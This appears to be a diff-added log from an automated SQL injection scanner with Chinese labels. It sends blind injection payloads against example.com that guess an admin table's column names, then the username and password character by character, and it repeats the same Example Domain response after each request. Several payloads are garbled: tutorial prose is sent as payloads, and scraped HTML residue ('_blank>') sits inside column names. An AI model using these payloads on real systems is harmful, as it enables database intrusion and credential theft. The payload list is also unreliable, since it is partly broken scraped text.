+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3229', 'Date': 'Tue, 26 Aug 2025 14:49:21 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)，耗时：2.29s）
+  → 测试 URL：https://example.com/?id=1&name=--+3.%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0+%E5%9C%A8len%28+%29+%E6%8B%AC%E5%8F%B7%E9%87%8C%E9%9D%A2%E5%8A%A0%E4%B8%8A%E6%88%91%E4%BB%AC%E6%83%B3%E5%88%B0%E7%9A%84%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0.
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3227', 'Date': 'Tue, 26 Aug 2025 14:49:23 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：-- 3.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.，耗时：1.70s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%2A%29%3E0%29--
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3224', 'Date': 'Tue, 26 Aug 2025 14:49:26 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(*)>0)--，耗时：6.71s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28%E7%94%A8%E6%88%B7%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0name%29%3E0%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3218', 'Date': 'Tue, 26 Aug 2025 14:49:32 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(用户字段名称name)>0)，耗时：3.92s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+len%28_blank%3E%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0password%29%3E0%29
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '648', 'Cache-Control': 'max-age=3214', 'Date': 'Tue, 26 Aug 2025 14:49:36 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)，耗时：1.48s）
+  → 测试 URL：https://example.com/?id=1&name=--+4.%E7%8C%9C%E8%A7%A3%E5%AD%97%E7%AC%A6
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3213', 'Date': 'Tue, 26 Aug 2025 14:49:37 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：-- 4.猜解字符，耗时：0.89s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+left%28name%2C1%29%3Da%29+---%E7%8C%9C%E8%A7%A3%E7%94%A8%E6%88%B7%E5%B8%90%E5%8F%B7%E7%9A%84%E7%AC%AC%E4%B8%80%E4%BD%8D
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3212', 'Date': 'Tue, 26 Aug 2025 14:49:38 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位，耗时：2.78s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+count%28%2A%29+from+admin+where+left%28name%2C2%29%3Dab%29---%E7%8C%9C%E8%A7%A3%E7%94%A8%E6%88%B7%E5%B8%90%E5%8F%B7%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%BD%8D
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3210', 'Date': 'Tue, 26 Aug 2025 14:49:40 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位，耗时：0.84s）
+  → 测试 URL：https://example.com/?id=1&name=--+%E5%B0%B1%E8%BF%99%E6%A0%B7%E4%B8%80%E6%AC%A1%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%E8%BF%99%E6%A0%B7%E7%8C%9C%2C%E7%8C%9C%E5%88%B0%E5%A4%9F%E4%BD%A0%E5%88%9A%E6%89%8D%E7%8C%9C%E5%87%BA%E6%9D%A5%E7%9A%84%E5%A4%9A%E5%B0%91%E4%BD%8D%E4%BA%86%E5%B0%B1%E5%AF%B9%E4%BA%86%2C%E5%B8%90%E5%8F%B7%E5%B0%B1%E7%AE%97%E5%87%BA%E6%9D%A5%E4%BA%86
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3208', 'Date': 'Tue, 26 Aug 2025 14:49:42 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：-- 就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了，耗时：2.26s）
+  → 测试 URL：https://example.com/?id=1&name=and+1%3D%28select+top+1+count%28%2A%29+from+Admin+where+Asc%28mid%28pass%2C5%2C1%29%29%3D51%29+--%E8%BF%99%E4%B8%AA%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E5%8F%AF%E4%BB%A5%E7%8C%9C%E8%A7%A3%E4%B8%AD%E6%96%87%E7%9A%84%E7%94%A8%E6%88%B7%E5%92%8C_blank%3E%E5%AF%86%E7%A0%81.%E5%8F%AA%E8%A6%81%E6%8A%8A%E5%90%8E%E9%9D%A2%E7%9A%84%E6%95%B0%E5%AD%97%E6%8D%A2%E6%88%90%E4%B8%AD%E6%96%87%E7%9A%84ASSIC%E7%A0%81%E5%B0%B1OK.%E6%9C%80%E5%90%8E%E6%8A%8A%E7%BB%93%E6%9E%9C%E5%86%8D%E8%BD%AC%E6%8D%A2%E6%88%90%E5%AD%97%E7%AC%A6.
+    ↳ 响应状态码：200
+    ↳ 响应头：{'Accept-Ranges': 'bytes', 'Content-Type': 'text/html', 'ETag': '"84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134"', 'Last-Modified': 'Mon, 13 Jan 2025 20:11:20 GMT', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Cache-Control': 'max-age=3206', 'Date': 'Tue, 26 Aug 2025 14:49:44 GMT', 'Alt-Svc': 'h3=":443"; ma=93600,h3-29=":443"; ma=93600', 'Content-Length': '648', 'Connection': 'keep-alive'}
+    ↳ 响应体（完整内容）：<!doctype html>
+<html>
+<head>
+    <title>Example Domain</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style type="text/css">
+    body {
+        background-color: #f0f0f2;
+        margin: 0;
+        padding: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        
+    }
+    div {
+        width: 600px;
+        margin: 5em auto;
+        padding: 2em;
+        background-color: #fdfdff;
+        border-radius: 0.5em;
+        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);
+    }
+    a:link, a:visited {
+        color: #38488f;
+        text-decoration: none;
+    }
+    @media (max-width: 700px) {
+        div {
+            margin: 0 auto;
+            width: auto;
+        }
+    }
+    </style>    
+</head>
+
+<body>
+<div>
+    <h1>Example Domain</h1>
+    <p>This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.</p>
+    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
+</div>
+</body>
+</html>
+
+    ✔️ 无明显漏洞（参数：name，Payload：and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.，耗时：1.60s）
